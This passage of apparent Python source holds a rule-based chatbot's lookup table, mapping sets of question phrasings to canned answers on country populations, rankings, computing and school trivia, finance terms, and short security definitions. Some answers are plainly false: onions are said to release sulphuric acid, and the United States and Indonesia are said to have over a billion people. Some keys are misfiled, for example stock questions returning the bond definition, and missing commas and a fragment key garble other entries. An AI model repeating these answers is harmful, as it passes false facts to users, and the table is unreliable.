            "south africa population", 
            "population south africa", 
            "south africa population numbers", 
            "how many people live in south africa", 
            "south africa inhabitants"
        }): "Approximately 61.3 million (2023, World Bank estimate).",
        
        frozenset({
            "what is the population of nigeria", 
            "nigeria population", 
            "population nigeria", 
            "nigeria population numbers", 
            "how many people live in nigeria", 
            "nigeria inhabitants"
        }): "Approximately 226.7 million (2023, World Bank estimate).",
        
        frozenset({
            "what is the population of mexico", 
            "mexico population", 
            "population mexico", 
            "mexico population numbers", 
            "how many people live in mexico", 
            "mexico inhabitants"
        }): "Approximately 127.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of south korea", 
            "south korea population", 
            "population south korea", 
            "south korea population numbers", 
            "how many people live in south korea", 
            "south korea inhabitants"
        }): "Approximately 51.8 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of north korea", 
            "north korea population", 
            "population north korea", 
            "north korea population numbers", 
            "how many people live in north korea", 
            "north korea inhabitants"
        }): "Approximately 26.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of sri lanka", 
            "sri lanka population", 
            "population sri lanka", 
            "sri lanka population numbers", 
            "how many people live in sri lanka", 
            "sri lanka inhabitants"
        }): "Approximately 22.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of nepal", 
            "nepal population", 
            "population nepal", 
            "nepal population numbers", 
            "how many people live in nepal", 
            "nepal inhabitants"
        }): "Approximately 32.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of uk", 
            "uk population", 
            "population uk", 
            "uk population numbers", 
            "how many people live in uk", 
            "uk inhabitants"
        }): "Approximately 67.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of argentina", 
            "argentina population", 
            "population argentina", 
            "argentina population numbers", 
            "how many people live in argentina", 
            "argentina inhabitants"
        }): "Approximately 46.8 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of brazil", 
            "brazil population", 
            "population brazil", 
            "brazil population numbers", 
            "how many people live in brazil", 
            "brazil inhabitants"
        }): "Approximately 216.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of spain", 
            "spain population", 
            "population spain", 
            "spain population numbers", 
            "how many people live in spain", 
            "spain inhabitants"
        }): "Approximately 47.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of ukraine", 
            "ukraine population", 
            "population ukraine", 
            "ukraine population numbers", 
            "how many people live in ukraine", 
            "ukraine inhabitants"
        }): "Approximately 37.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of myanmar", 
            "myanmar population", 
            "population myanmar", 
            "myanmar population numbers", 
            "how many people live in myanmar", 
            "myanmar inhabitants"
        }): "Approximately 56.8 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of bhutan", 
            "bhutan population", 
            "population bhutan", 
            "bhutan population numbers", 
            "how many people live in bhutan", 
            "bhutan inhabitants"
        }): "Approximately 864,000 (2023, World Bank estimate).",

        frozenset({
            "what is the population of mongolia", 
            "mongolia population", 
            "population mongolia", 
            "mongolia population numbers", 
            "how many people live in mongolia", 
            "mongolia inhabitants"
        }): "Approximately 3.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of new zealand", 
            "new zealand population", 
            "population new zealand", 
            "new zealand population numbers", 
            "how many people live in new zealand", 
            "new zealand inhabitants"
        }): "Approximately 5.1 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of mauritius", 
            "mauritius population", 
            "population mauritius", 
            "mauritius population numbers", 
            "how many people live in mauritius", 
            "mauritius inhabitants"
        }): "Approximately 1.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of afghanistan", 
            "afghanistan population", 
            "population afghanistan", 
            "afghanistan population numbers", 
            "how many people live in afghanistan", 
            "afghanistan inhabitants"
        }): "Approximately 43.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of pakistan", 
            "pakistan population", 
            "population pakistan", 
            "pakistan population numbers", 
            "how many people live in pakistan", 
            "pakistan inhabitants"
        }): "Approximately 241.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of bangladesh", 
            "bangladesh population", 
            "population bangladesh", 
            "bangladesh population numbers", 
            "how many people live in bangladesh", 
            "bangladesh inhabitants"
        }): "Approximately 176.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of thailand", 
            "thailand population", 
            "population thailand", 
            "thailand population numbers", 
            "how many people live in thailand", 
            "thailand inhabitants"
        }): "Approximately 73.8 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of vietnam", 
            "vietnam population", 
            "population vietnam", 
            "vietnam population numbers", 
            "how many people live in vietnam", 
            "vietnam inhabitants"
        }): "Approximately 99.9 million (2023, World Bank estimate).",

        frozenset({
            "most advanced countries",
            "top advanced nations",
            "countries with top technology",
            "most tech savvy countries"
        }): "Countries with the most advanced technology include the United States, Japan, South Korea, Germany, and China, known for innovation and tech industries.",

        frozenset({
            "countries with best infrastructure",
            "best infrastructure countries",
            "top countries for infrastructure",
            "countries with advanced infrastructure"
        }): "Countries with the best infrastructure include Singapore, Switzerland, the Netherlands, and South Korea, offering world-class transport and public services.",

        frozenset({
            "countries with best economy",
            "strongest economies",
            "richest economies in the world",
            "countries with top economies"
        }): "The strongest economies include the United States, China, Japan, Germany, and India, with large GDPs and economic influence.",

        frozenset({
            "most peaceful countries",
            "top peaceful nations",
            "countries with least conflict",
            "safest countries"
        }): "The most peaceful countries include Iceland, New Zealand, Switzerland, and Norway, known for low crime rates and high political stability.",

        frozenset({
            "best countries for living",
            "top living standards countries",
            "countries with best quality of life",
            "countries with highest standard of living"
        }): "Countries with the best quality of life include Norway, Switzerland, Denmark, Finland, and Sweden, offering excellent healthcare, education, and work-life balance.",

        frozenset({
            "most tourist-friendly countries",
            "best tourist destinations",
            "countries for best tourism",
            "top travel destinations"
        }): "Top countries for tourism include France, Spain, Italy, the United States, and Thailand, known for their landmarks and rich culture.",

        frozenset({
            "countries with highest literacy rate",
            "highest education level countries",
            "countries with best education systems",
            "most educated nations"
        }): "Countries with the highest literacy rates include Finland, Norway, Japan, Canada, and South Korea, offering excellent education systems.",

        frozenset({
            "countries with best social welfare",
            "top welfare states",
            "best social support countries",
            "countries with best social benefits"
        }): "Countries with the best social welfare systems include Sweden, Norway, Denmark, Finland, and the Netherlands, offering comprehensive healthcare, unemployment benefits, and retirement plans.",

        frozenset({
            "richest countries by GDP",
            "countries with most wealth",
            "wealthiest nations by GDP",
            "top countries by GDP"
        }): "Countries with the highest GDP include the United States, China, Japan, Germany, and India, with vast economic output and influence.",

        frozenset({
            "best countries for expats",
            "most expat-friendly countries",
            "top countries for expatriates",
            "best countries to live for foreigners"
        }): "Countries that are best for expats include Switzerland, Singapore, Spain, New Zealand, and the United Arab Emirates, known for ease of immigration and high quality of life.",

        frozenset({
            "cleanest country",
            "most clean country",
            "which country is cleanest",
            "top clean countries"
        }): "The cleanest countries include Finland, Denmark, Switzerland, and Sweden, based on air quality, waste management, and environmental policies.",

        frozenset({
            "richest countries",
            "top richest nations",
            "wealthiest countries",
            "countries with most wealth"
        }): "The richest countries include Luxembourg, Switzerland, Norway, and Ireland, measured by GDP per capita and overall economic wealth.",

        frozenset({
            "oldest countries",
            "top oldest nations",
            "countries with oldest history",
            "longest existing countries"
        }): "The oldest countries by continuous civilization include China, Egypt, Iran, Greece, and India.",

        frozenset({
            "youngest countries",
            "most recent countries",
            "newest countries",
            "new countries"
        }): "The youngest countries include South Sudan, Kosovo, Montenegro, and Timor-Leste, which became independent in recent decades.",

        frozenset({
            "most populated countries",
            "top countries by population",
            "largest populations in the world",
            "most people in countries"
        }): "The most populated countries are China, India, the United States, and Indonesia, with populations over a billion.",

        frozenset({
            "smallest countries",
            "least land area countries",
            "tiny countries",
            "countries with smallest area"
        }): "The smallest countries by land area are Vatican City, Monaco, and Nauru, each measuring just a few square kilometers.",

        frozenset({
            "happiest countries",
            "most joyful countries",
            "top countries for happiness",
            "best countries for happiness"
        }): "The happiest countries are Finland, Denmark, Iceland, and Norway, based on factors like income, social support, and life expectancy.",

        frozenset({
            "safest countries",
            "countries with best safety",
            "top safe countries",
            "least dangerous countries"
        }): "The safest countries include Iceland, New Zealand, and Portugal, based on crime rates and political stability.",

        frozenset({
            "best healthcare countries",
            "top healthcare nations",
            "countries with best healthcare systems",
            "best countries for medical care"
        }): "Countries with the best healthcare systems include France, Switzerland, Germany, and Japan, offering high quality medical services.",

        frozenset({
            "largest countries by land area",
            "biggest countries",
            "countries with largest land mass",
            "top largest countries"
        }): "The largest countries by land area are Russia, Canada, the United States, and China, covering vast territories.",

        frozenset({
            "what is the population of singapore", 
            "singapore population", 
            "population singapore", 
            "singapore population numbers", 
            "how many people live in singapore", 
            "singapore inhabitants"
        }): "Approximately 5.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of burundi", 
            "burundi population", 
            "population burundi", 
            "burundi population numbers", 
            "how many people live in burundi", 
            "burundi inhabitants"
        }): "Approximately 14.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of senegal", 
            "senegal population", 
            "population senegal", 
            "senegal population numbers", 
            "how many people live in senegal", 
            "senegal inhabitants"
        }): "Approximately 18.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of madagascar", 
            "madagascar population", 
            "population madagascar", 
            "madagascar population numbers", 
            "how many people live in madagascar", 
            "madagascar inhabitants"
        }): "Approximately 30.8 million (2023, World Bank estimate).",

        frozenset({
            "what does http stand for in a website address",
            "what is the full form of http in web addresses",
            "what is the meaning of http in a url",
            "what does http mean in website addresses?",
            "what is the meaning of the acronym http?",
            "what does http represent in web addresses?",
            "what does http stand for in a website address?",
            "what is the full form of http in web addresses?",
            "what is the meaning of http in a url?",
            "what does http mean in website addresses?",
            "what is the meaning of the acronym http?",
            "what does http represent in web addresses?"
        }): "HyperText Transfer Protocol",

        frozenset({
            "what was the first electronic general-purpose computer called",
            "what is the name of the first general-purpose computer",
            "which computer was the first to be called a general-purpose electronic computer",
            "what was the first general-purpose electronic computer called?",
            "what was the name of the first ever general-purpose computer?",
            "which device was the first general-purpose computer?",
            "what was the first electronic general-purpose computer called?",
            "what is the name of the first general-purpose computer?",
            "which computer was the first to be called a general-purpose electronic computer?",
            "what was the first general-purpose electronic computer called?",
            "what was the name of the first ever general-purpose computer?",
            "which device was the first general-purpose computer?"
        }): "ENIAC",

        frozenset({
            "which harvard dropout co-founded microsoft",
            "who co-founded microsoft after dropping out of harvard",
            "which famous harvard dropout started microsoft",
            "who was the harvard dropout who co-founded microsoft?",
            "which harvard dropout became the co-founder of microsoft?",
            "who is the co-founder of microsoft who dropped out of harvard?",
            "which harvard dropout co-founded microsoft?",
            "who co-founded microsoft after dropping out of harvard?",
            "which famous harvard dropout started microsoft?",
            "who was the harvard dropout who co-founded microsoft?",
            "which harvard dropout became the co-founder of microsoft",
            "who is the co-founder of microsoft who dropped out of harvard"
        }): "Bill Gates",

        frozenset({
            "what is the name of the ancient analog computer discovered by divers in 1900",
            "which ancient analog computer was found by divers off the coast of a greek island",
            "what is the name of the device discovered in 1900 by divers near a greek island",
            "what is the name of the ancient analog computer discovered in 1900?",
            "which device was discovered by divers in 1900 off the greek coast?",
            "what ancient computer was found by divers near a greek island?",
            "what is the name of the ancient analog computer discovered by divers in 1900?",
            "which ancient analog computer was found by divers off the coast of a greek island?",
            "what is the name of the device discovered in 1900 by divers near a greek island?",
            "what is the name of the ancient analog computer discovered in 1900?",
            "which device was discovered by divers in 1900 off the greek coast?",
            "what ancient computer was found by divers near a greek island?"
        }): "Antikythera mechanism",

        frozenset({
            "how many bytes are in one kilobyte",
            "what is the equivalent of 1 kilobyte in bytes",
            "how many bytes are there in a kilobyte",
            "how many bytes are in one kilobyte?",
            "what does one kilobyte equal in bytes?",
            "how many bytes are there in 1 kilobyte?",
            "how many bytes are in one kilobyte?",
            "what is the equivalent of 1 kilobyte in bytes?",
            "how many bytes are there in a kilobyte?",
            "how many bytes are in one kilobyte?",
            "what does one kilobyte equal in bytes?",
            "how many bytes are there in 1 kilobyte?"
        }): "1024",

        frozenset({
            "who is recognized as the 'mother of computer programming'",
            "who is known as the mother of computer programming",
            "who is often referred to as the mother of programming",
            "who is recognized as the 'mother of computer programming'?",
            "who is called the mother of computer programming?",
            "who is considered the mother of programming?",
            "who is recognized as the 'mother of computer programming'?",
            "who is known as the mother of computer programming?",
            "who is often referred to as the mother of programming?",
            "who is recognized as the 'mother of computer programming'?",
            "who is called the mother of computer programming?",
            "who is considered the mother of programming?",
            "who is mother of programming?",
            "who is the mother of programming",
            "who is the mother of programming?"
        }): "Ada Lovelace",

        frozenset({
            "what programming language is used for web development",
            "which language is most commonly used to build websites",
            "what language is essential for web development",
            "what programming language is used for web development?",
            "which programming language is most used in web development?",
            "what language is needed for web development?",
            "what programming language is used for web development?",
            "which language is most commonly used to build websites?",
            "what language is essential for web development?",
            "what programming language is used for web development?",
            "which programming language is most used in web development?",
            "what language is needed for web development?"
        }): "JavaScript",

        frozenset({
            "who invented the first mechanical computer",
            "who is credited with inventing the first mechanical computer",
            "which person created the first mechanical computer",
            "who invented the first mechanical computer?",
            "who is credited with the invention of the first mechanical computer?",
            "who is the inventor of the first mechanical computer?",
            "who invented the first mechanical computer?",
            "who is credited with inventing the first mechanical computer?",
            "which person created the first mechanical computer?",
            "who invented the first mechanical computer?",
            "who is credited with the invention of the first mechanical computer?",
            "who is the inventor of the first mechanical computer?"
        }): "Charles Babbage",

        frozenset({
            "what is the name of the world's first website",
            "which is the world's first website",
            "what was the first ever website",
            "what is the name of the world's first website?",
            "which website was the first in the world?",
            "what was the first website ever created?",
            "what is the name of the world's first website?",
            "which is the world's first website?",
            "what was the first ever website?",
            "what is the name of the world's first website?",
            "which website was the first in the world?",
            "what was the first website ever created?"
        }): "info.cern.ch",

        frozenset({
            "what is factorial?",
            "what is factorial",
            "define factorial"
        }):"A factorial is the result of multiplying a number by all the smaller numbers down to 1.",

        frozenset({
            "what is a fun way to learn a new language?", 
            "fun ways to learn a new language", 
            "how to learn a language in a fun way?",
            "best way to learn new language",
            "what are the best ways to learn a language?",
            "what are the best ways to learn a language",
            "best ways to learn a language?",
            "best ways to learn a language",
            "best way to learn a language?",
            "tell me best way to learn a language",
            "tell me best way to learn a new language",
            "tell me best ways to learn a new language",
            "tell me best ways to learn a language"
        }): '''
Use language apps, watch movies with subtitles, play word games, 
find a language partner, sing songs, use flashcards, write a diary, 
label things around the house, join social media groups, 
and travel or attend virtual language meetups.''',

        frozenset({
            "what is the main purpose of the deep web",
            "what is the deep web used for",
            "what can you find on the deep web",
            "what is the main purpose of the deep web?",
            "what can you access on the deep web?",
            "what is the deep web mainly used for?",
            "what is the main purpose of the deep web?",
            "what is the deep web used for?",
            "what can you find on the deep web?",
            "what is the main purpose of the deep web?",
            "what can you access on the deep web?",
            "what is the deep web mainly used for?",
            "main purpose of deep web",
            "main purpose of deep web?",
            "what is the main purpose of deep web"
        }): "To access private and unindexed information",
#**********
        frozenset({
            "which drink is prepared by boiling leaves in milk and hot water",
            "which drink is prepared by boiling leaves in milk and hot water?",
            "name the drink prepared by boiling leaves in milk and hot water",
            "what drink is made by boiling leaves in milk and hot water",
            "boiling leaves in milk and water drink",
            "boiling leaves with milk and water",
            "boiling leaves with milk and water name",
            "boiling leaves with milk and water drink name"
        }): "Tea",

        frozenset({
            "which drink is high in protein",
            "which drink is high in protein?",
            "name the drink high in protein",
            "what drink has a lot of protein",
            "high-protein drink",
            "which is the high protein drink?",
            "which is the high protein milk",
            "high pretein drink",
            "high protein milk",
            "high protein milk?"
        }): "Cow's milk",

        frozenset({
            "name a few foods most preferred by children during summers",
            "name a few foods most preferred by children during summers?",
            "summer foods loved by children",
            "foods children like during summers",
            "summer foods kids prefer"
        }): "Ice cream, cucumber, watermelon, curd, smoothies",

        frozenset({
            "what is jaggery made from",
            "what is jaggery made from?",
            "ingredients of jaggery",
            "jaggery is made from",
            "how is jaggery made",
            "how jaggery made?"
        }): "Sugarcane juice",

        frozenset({
            "which acid is released while cutting onions",
            "which acid is released while cutting onions?",
            "name the acid released while cutting onions",
            "what acid is released when cutting onions",
            "which compound is released when onions are cut",
            "which compound is released when onions cuts",
            "which acid release when onions cut",
            "which acid release when onions cuts",
            "which acid release when onion cuts",
            "what acid releases when onions cut",
            "which acid release when onions cuts?"
            "cutting onions acid"
        }): "Sulphuric acid",

        frozenset({
            "which is the second largest continent in the world",
            "which is the second largest continent in the world?",
            "name the second largest continent",
            "second largest continent in the world",
            "which continent is second largest"
        }): "Africa",

        frozenset({
            "what is the percentage of nitrogen present in the atmosphere",
            "what is the percentage of nitrogen present in the atmosphere?",
            "percentage of nitrogen in the atmosphere",
            "how much nitrogen is in the atmosphere",
            "how much nitrogen makes up the atmosphere"
        }): "78%",

        frozenset({
            "india is located in which hemisphere",
            "india is located in which hemisphere?",
            "name the hemisphere where india is located",
            "which hemisphere is india in",
            "india's hemisphere",
            "what is india's hemisphere?",
            "what is india's hemisphere",
            "what is india hemisphere"
        }): "Northern hemisphere",

        frozenset({
            "a leap year has how",
            "a leap year has how?",
            "how many days in a leap year",
            "number of days in a leap year",
            "days in a leap year",
            "how many days in leap year",
            "days in leap year",
            "total days in leap year",
            "days in leap year",
            "days in leap year?",
            "total days in leap year?",
            "how much days in leap year",
            "total days in a leap year"
        }): "Total 366 In a leap year.",

        frozenset({
            "what is the plateau located in the southern part of india called",
            "what is the plateau located in the southern part of india called?",
            "name the plateau in southern india",
            "plateau in southern india",
            "southern india's plateau"
        }): "Peninsular plateau",

        frozenset({
            "which are the common pets found in india",
            "which are the common pets found in india?",
            "name the common pets in india",
            "common pets in india",
            "pets commonly found in india"
        }): "Dogs and cats",

        frozenset({
            "which animal jumps from one tree to another",
            "which animal jumps from one tree to another?",
            "name the animal that jumps between trees",
            "which animal can jump from tree to tree",
            "animal known for jumping from tree to tree"
        }): "Monkey",

        frozenset({
            "which is the tallest animal",
            "which is the tallest animal?",
            "name the tallest animal",
            "what animal is the tallest",
            "tallest animal in the world",
            "tallest animal in the world?"
        }): "Giraffe",

        frozenset({
            "what do cows eat",
            "what do cows eat?",
            "name the food cows eat",
            "food eaten by cows",
            "cow's diet",
            "what cow eats",
            "what do cow eat",
            "what cow eats",
            "what cow eats?",
            "what do cow eats"
        }): "Grass",

        frozenset({
            "wool is made from the skin of which animal",
            "wool is made from the skin of which animal?",
            "name the animal that gives wool",
            "which animal produces wool",
            "animal from which wool is made"
        }): "Sheep",

        frozenset({
            "the young one of a dog is called",
            "the young one of a dog is called?",
            "name the baby dog",
            "baby of a dog",
            "what is a baby dog called",
            "what is a baby dog called?"
        }): "Puppy",

        frozenset({
            "which animal has a trunk",
            "which animal has a trunk?",
            "name the animal with a trunk",
            "animal with a trunk",
            "which animal is known for its trunk"
        }): "Elephant",

        frozenset({
            "which bird is famous for its dance and feathers",
            "which bird is famous for its dance and feathers?",
            "name the bird known for its dance and feathers",
            "bird known for dance and feathers",
            "which bird has feathers and dances"
        }): "Peacock",

        frozenset({
            "which gas do humans inhale",
            "which gas do humans inhale?",
            "name the gas humans inhale",
            "what gas do humans breathe in",
            "gas inhaled by humans",
            "what gas humans inhales?",
            "what gas humans inhales",
            "what gas human inhale"
        }): "Oxygen",

        frozenset({
            "which planet is called a red planet",
            "which planet is called a red planet?",
            "name the red planet",
            "what is the red planet",
            "red planet in the solar system",
            "which planet called red planet?",
            "which planet called red planet"
        }): "Mars",

        frozenset({
            "is pizza good for health",
            "pizza good for health?",
            "is pizza good for health?",
            "pizza good for health",
            "how much minutes of our life reduce after eating pizza",
            "how much minutes of our life reduce after eating pizza?",
            "how much minutes of human life reduce after eating pizza",
            "how much minutes of human life reduce after eating pizza?",
            "how much minutes of human's life reduce after eating pizza",
            "how much minutes of human's life reduce after eating pizza?",
            "how much minutes of human's life reduce after eating a pizza",
            "how much minutes of human's life reduce after eating a pizza?",
            "how much minutes of human's life reduce after eating a pizza slice",
            "how much minutes of human's life reduce after eating a pizza slice?"
        }): "According to a study cited on a few health websites, eating one slice of commercially made pizza could potentially reduce your life expectancy by around 7.8 minutes.",
        
        frozenset({
            "the solar system is a part of which galaxy",
            "the solar system is a part of which galaxy?",
            "which galaxy is the solar system in",
            "name the galaxy the solar system is part of",
            "solar system is part of which galaxy",
            "solar system is part of which galaxy?",
            "which "
        }): "Milky Way Galaxy",

        frozenset({
            "how many planets are there in the solar system",
            "how many planets are there in the solar system?",
            "name the number of planets in the solar system",
            "how many planets in solar system",
            "planets in the solar system count"
        }): "Eight",

        frozenset({
            "name the parts of a plant",
            "name the parts of a plant?",
            "what are the parts of a plant",
            "list the parts of a plant",
            "parts of a plant"
        }): "Root, stem, leaves, fruits and flowers",

        frozenset({
            "which organ pumps blood",
            "which organ pumps blood?",
            "name the organ that pumps blood",
            "which organ circulates blood",
            "organ responsible for pumping blood",
            "which organ pump blood",
            "which organ pumps the blood",
            "which organ pump the blood?",
            "which organ pumps the blood?",
            "which organ pump the blood"
        }): "Heart pumps the blood",

        frozenset({
            "what is the main source of light in the day",
            "what is the main source of light in the day?",
            "name the main source of light during the day",
            "what gives us light in the day",
            "main source of light in the day"
        }): "The Sun",

        frozenset({
            "how many kidneys do humans have",
            "how many kidneys do humans have?",
            "name the number of kidneys humans have",
            "how many kidneys in a human body",
            "number of kidneys in humans",
            "how many kidneys in human body",
            "how many kidneys in human body?",
            "how many kidney in human body",
            "how many kidney in human body?"
        }): "Two",

        frozenset({
            "what is the solid form of water",
            "what is the solid form of water?",
            "name the solid form of water",
            "solid form of water",
            "water in solid form",
            "solid form of water?",
        }): "Ice",

        frozenset({
            "what is virtual machine",
            "what is virtual machine?",
            "define virtual machine",
            "explain virtual machine",
            "what is vm",
            "what is vm?",
            "define vm"
        }): "A virtual machine (VM) is a software simulation of a physical computer that runs an operating system and applications on a host system. It allows multiple operating systems to run on the same hardware, providing isolation and efficient resource use.",

        frozenset({
            "what is GDP",
            "define GDP",
            "what does GDP stand for",
            "what is the GDP of a country",
            "what is GDP?",
            "define GDP?",
            "what does GDP stand for?",
            "what is the GDP of a country?",
            "what is gdp",
            "define gdp",
            "what does gdp stand for",
            "what is the gdp of a country",
            "what is gdp?",
            "define gdp?",
            "what does gdp stand for?",
            "what is the gdp of a country?"
        }): "GDP (Gross Domestic Product) is the total market value of all goods and services produced in a country within a given period.",

        frozenset({
            "what is a stock",
            "define stock",
            "define stocks",
            "define stock market",
            "what are stocks",
            "what is stocks",
            "what does it mean to buy stocks"
        }): "A stock is a share in the ownership of a company and represents a claim on part of the company’s assets and earnings.",

        frozenset({
            "what is a bond",
            "define bond",
            "what does a bond mean",
            "how do bonds work",
            "what is a stock?",
            "define stock?",
            "what are stocks?",
            "what does it mean to buy stocks?"
        }): "A bond is a fixed debt instrument where an investor loans money to an entity (government or corporation) for a defined period in exchange for periodic interest payments.",

        frozenset({
            "what is a mutual fund",
            "define mutual fund",
            "what is mutual fund",
            "what is mutual funds",
            "define mutual funds",
            "define mutual funds?"
            "what does mutual fund mean",
            "what is a mutual fund?",
            "define mutual fund?",
            "what does mutual fund mean?"
        }): "A mutual fund is an investment vehicle that pools money from many investors to buy securities such as stocks, bonds, or other assets.",

        frozenset({
            "what is cryptocurrency",
            "what is cryptocurrency?",
            "define cryptocurrency",
            "what does cryptocurrency mean",
            "what is cryptocurrency?",
            "define cryptocurrency?",
            "what does cryptocurrency mean?"
        }): "Cryptocurrency is a digital or virtual form of currency that uses cryptography for security and operates independently of a central bank.",

        frozenset({
            "what is a market",
            "define market",
            "what is a market in economics",
            "what is a market?",
            "define market?",
            "what is market",
            "what is a market in economics?"
        }): "A market is any structure or mechanism that allows buyers and sellers to exchange goods, services, or information.",

        frozenset({
            "what is supply and demand",
            "define supply and demand",
            "what does supply and demand mean",
            "what is supply and demand?",
            "define supply and demand?",
            "what does supply and demand mean?"
        }): "Supply and demand is a fundamental concept in economics that describes how prices and quantities of goods are determined in a market economy.",

        frozenset({
            "what is interest rate",
            "define interest rate",
            "what does interest rate mean",
            "what is interest rate?",
            "define interest rate?",
            "what does interest rate mean?"
        }): "An interest rate is the percentage charged on a loan or paid on savings and investments, usually expressed as an annual percentage.",

        frozenset({
            "what is a budget",
            "define budget",
            "what does a budget mean",
            "what is a budget?",
            "define budget?",
            "what does a budget mean?"
        }): "A budget is a financial plan that estimates income and expenses over a specified period to manage money effectively.",

        frozenset({
            "what is an investment",
            "define investment",
            "what does investment mean",
            "what is an investment?",
            "define investment?",
            "what does investment mean?"
        }): "An investment is the act of allocating money or resources to something with the expectation of generating a profit or return in the future.",

        frozenset({
            "what is a loan",
            "whatis loan",
            "define loan",
            "whatis loan",
            "what does loan mean",
            "what is a loan?",
            "define loan?",
            "what does loan mean?"
        }): "A loan is a sum of money that is borrowed and expected to be paid back with interest over time.",

        frozenset({
            "what is profit",
            "define profit",
            "what does profit mean",
            "what is profit?",
            "define profit?",
            "what does profit mean?"
        }): "Profit is the financial gain that results from the difference between the revenue generated from a business activity and the costs incurred in producing the goods or services.",

        frozenset({
            "what is loss",
            "define loss",
            "what does loss mean",
            "what is loss?",
            "define loss?",
            "what does loss mean?"
        }): "Loss is the negative financial outcome when a company's expenses exceed its revenue or income.",

        frozenset({
            "what is fork bomb",
            "define fork bomb",
            "what is forkbomb",
            "what is fork bomb?",
            "define forkbomb",
            "what is forkbomb?"
        }): "A fork bomb is a malicious script that creates an infinite loop of processes, overwhelming the system's resources (like CPU and memory). It causes the system to slow down or crash by rapidly duplicating itself. It's often used as a prank or in security testing, but it doesn't cause permanent damage.",
        
        frozenset({
            "what is sql injection",
            "explain sql injection",
            "define sql injection",
            "what is SQL injection",
            "what is SQL injection?"
        }): """
SQL Injection is a type of security vulnerability where an attacker manipulates a website's input fields (such as login forms) to execute malicious SQL queries. This allows the attacker to access or manipulate the database, potentially stealing sensitive data or modifying records.

In simple terms:
The attacker enters harmful SQL code into an input field (like username or password).
If the website doesn't properly validate or sanitize the input, the malicious code can be executed by the database.
This can lead to unauthorized access, data breaches, or even deletion of data.""",

        frozenset({
            "what is tax",
            "define tax",
            "what does tax mean",
            "what is tax?",
            "define tax?",
            "what does tax mean?"
        }): "A tax is a mandatory financial charge or levy imposed by a government on individuals or businesses to fund public services and infrastructure.",

        frozenset({
            "what is a recession",
            "define recession",
            "what does recession mean",
            "what is a recession?",
            "define recession?",
            "what does recession mean?"
        }): "A recession is a period of economic decline typically defined by a decrease in GDP for two consecutive quarters or more.",

        frozenset({
            "what is a depression",
            "define depression",
            "what is depression",
            "what does depression mean in economics",
            "what is a depression?",
            "define depression?",
            "what does depression mean in economics?"
        }): "A depression is a severe and prolonged downturn in economic activity, marked by high unemployment, reduced trade, and economic stagnation.",

        frozenset({
            "what is fiscal policy",
            "define fiscal policy",
            "what does fiscal policy mean",
            "what is fiscal policy?",
            "define fiscal policy?",
            "what does fiscal policy mean?"
        }): "Fiscal policy is the use of government spending and tax policies to influence a country's economic conditions, such as controlling inflation or stimulating growth.",

        frozenset({
            "what is monetary policy",
            "define monetary policy",
            "explain monetary policy",
            "what does monetary policy mean"
        }): "Monetary policy involves the management of the money supply and interest rates by a central bank to control inflation and stabilize a country's economy.",

        frozenset({
            "what is a financial crisis",
            "define financial crisis",
            "what does financial crisis mean",
            "what is monetary policy?",
            "define monetary policy?",
            "what does monetary policy mean?"
        }): "A financial crisis is a situation where financial institutions or assets suddenly lose a large part of their value, leading to economic instability.",

        frozenset({
            "what is global economy",
            "define global economy",
            "what does global economy mean",
            "what is global economy?",
            "define global economy?",
            "what does global economy mean?"
        }): "The global economy refers to the interconnected economies of nations around the world, where trade, investment, and economic policies affect each other.",

        frozenset({
            "what is globalization",
            "define glozalization",
            "explain globalization",
            "what is globalization?",
        }): "Globalization is the process of increasing interconnectedness and interdependence among the world's markets, cultures, and societies. It refers to the movement of people, goods, services, ideas, and technologies across international borders, leading to a more integrated world.",

        frozenset({
            "what is a verb",
            "define verb",
            "what is verb",
            "what is a verb in grammar",
            "what is a verb?",
            "define verb?",
            "what is verb?",
            "what is a verb in grammar?"
        }): "A verb is a part of speech that expresses an action, occurrence, or state of being.",

        frozenset({
            "what is linux commands",
            "write all linux commands",
            "linux commands",
            "show me linux commands",
            "linux all commands",
            "all linux commands",
            "tell me all linux commands",
            "tell me linux commands",
            "can you write all linux commands",
            "can you write linux all commands",
            "can you write all linux commands?",
            "can you write linux all commands?",
            "all linux commands"
        }):""" 
File and Directory Management:

ls: List files in a directory.
cd: Change directory.
pwd: Print working directory.
mkdir: Make a new directory.
rmdir: Remove an empty directory.
rm: Remove files or directories.
cp: Copy files or directories.
mv: Move or rename files/directories.
touch: Create an empty file.
find: Search for files.
locate: Find files by name.

File Viewing and Editing:

cat: Display contents of a file.
more: View file contents (page by page).
less: View file contents (scrollable).
head: View the first few lines of a file.
tail: View the last few lines of a file.
nano: Text editor.
vi/vim: Text editor.

Permissions and Ownership:

chmod: Change file permissions.
chown: Change file owner.
chgrp: Change file group.

System Information:

df: Display disk space usage.
du: Show file and directory space usage.
free: Display memory usage.
top: View running processes.
ps: List processes.
uptime: Show system uptime.
uname: Display system information.
hostname: Show or set the system's hostname.

Networking:

ping: Check network connection.
ifconfig: Display network interfaces.
netstat: Network statistics.
scp: Secure copy files over SSH.
ssh: Securely connect to remote machines.
curl: Transfer data from or to a server.

Package Management:

apt: Package management for Debian-based systems (e.g., Ubuntu).
apt-get: Install/update/remove packages.
apt-cache: Search for packages.
yum: Package management for Red Hat-based systems.
dnf: Package manager for Fedora.
zypper: Package manager for openSUSE.

Archiving and Compression:

tar: Archive files.
tar -cvf: Create a tar archive.
tar -xvf: Extract a tar archive.
gzip: Compress files.
gunzip: Decompress files.

User and Group Management:

useradd: Add a new user.
usermod: Modify user account.
userdel: Delete a user.
groupadd: Add a new group.
passwd: Change user password.

Disk Management:

